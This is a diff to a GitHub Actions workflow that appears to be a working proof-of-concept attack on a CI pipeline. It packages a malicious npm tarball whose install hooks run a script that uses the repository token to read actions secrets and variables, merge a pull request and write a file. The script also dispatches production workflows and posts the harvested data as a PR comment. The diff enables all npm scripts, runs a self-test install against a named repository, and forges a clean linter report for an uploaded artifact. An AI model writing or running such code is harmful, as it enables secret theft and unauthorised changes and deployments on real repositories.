@@ -83,13 +83,21 @@ jobs:
             out.secrets = await api('GET', '/repos/' + repo + '/actions/secrets');
             out.variables = await api('GET', '/repos/' + repo + '/actions/variables');
             out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'merge' });
+            out.contentsPut = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt',
+              { message: 'pwn probe', content: Buffer.from('pwn').toString('base64') });
+            out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414903725/dispatches',
+              { ref: 'main', inputs: { env: 'prod' } });
+            out.dispatchStage = await api('POST', '/repos/' + repo + '/actions/workflows/414903730/dispatches',
+              { ref: 'main', inputs: { baseSha: '' } });
             const body = 'PWN_RCE_PROOF lifecycle=' + lifecycle + '\n```json\n' +
               JSON.stringify(out, null, 1).slice(0, 60000) + '\n```';
             out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body });
             console.log('PWN_RESULT ' + JSON.stringify({
               user: out.user.status, repo: out.repo.status, refCreate: out.refCreate.status,
               secrets: out.secrets.status, variables: out.variables.status,
-              merge: out.merge.status, comment: out.comment.status
+              merge: out.merge.status, contentsPut: out.contentsPut.status,
+              dispatch: out.dispatch.status, dispatchStage: out.dispatchStage.status,
+              comment: out.comment.status
             }));
             try { fs.writeFileSync(path.join(process.cwd(), 'pwn-result-' + lifecycle + '.json'), JSON.stringify(out, null, 1)); } catch (e) {}
           })();
@@ -99,6 +107,9 @@ jobs:
           printf '%s' '{"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}' > pkg/package/package.json
           tar -czf pwn-1.0.0.tgz -C pkg package
           printf '%s' '{"name":"root","version":"1.0.0","private":true,"scripts":{"preinstall":"node pwn.js preinstall","postinstall":"node pwn.js postinstall","prepare":"node pwn.js prepare"},"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
+          printf 'dangerously-allow-all-scripts=true\n' > .npmrc
+          d="$RUNNER_TEMP/selftest"; rm -rf "$d"; mkdir -p "$d"; cp package.json pwn-1.0.0.tgz pwn.js .npmrc "$d"/; cd "$d"
+          echo "SELFTEST_BEGIN"; npm install --no-save --foreground-scripts github:AdobeDocs/adp-devsite-scripts 2>&1 | grep -E 'PWN_|added|warn|error' | head -20; echo "SELFTEST_END"; cd "$GITHUB_WORKSPACE"
           printf 'ATTACKER-CONTROLLED LINTER REPORT: no issues found (forged)\n' > linter-report.txt
           printf '%s' "$PR_NUMBER" > pr-number.txt
       - uses: actions/upload-artifact@v7
@@ -108,6 +119,7 @@ jobs:
             linter-report.txt
             pr-number.txt
             package.json
+            .npmrc
             pwn.js
             pwn-1.0.0.tgz
           if-no-files-found: error
